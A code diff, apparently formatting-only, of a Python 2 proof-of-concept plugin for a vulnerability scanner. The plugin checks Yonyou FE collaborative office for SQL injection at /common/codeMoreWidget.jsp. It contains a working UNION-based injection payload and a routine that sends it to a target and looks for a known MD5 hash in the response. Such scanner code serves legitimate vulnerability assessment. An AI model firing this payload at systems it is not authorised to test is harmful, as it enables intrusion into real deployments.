@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Yonyou_0001'  # 平台漏洞编号，留空
     name = '用友FE协作办公系统 /common/codeMoreWidget.jsp SQL Injection'  # 漏洞名称
@@ -12,11 +13,12 @@ class Vuln(ABVuln):
     desc = '''
         用友FE协作办公系统某处过滤不严，导致SQL注入漏洞。
     '''  # 漏洞描述
-    ref = 'Unknown'  # 漏洞来源    
+    ref = 'Unknown'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = 'Yonyou(用友)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '021adbd7-f59b-4a20-9caa-09388a6f4f4d'
@@ -31,20 +33,21 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #ref: http://www.wooyun.org/bugs/wooyun-2015-0116706
+            # ref: http://www.wooyun.org/bugs/wooyun-2015-0116706
             payload = ('/common/codeMoreWidget.jsp?code=12%27%20UNION%20ALL%20SELECT%20sys.fn_varbinto'
                        'hexstr(hashbytes(%27MD5%27,%271234%27))--')
             verify_url = self.target + payload
             content = requests.get(verify_url).content
             if '81dc9bdb52d04dc20036dbd8313ed055' in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
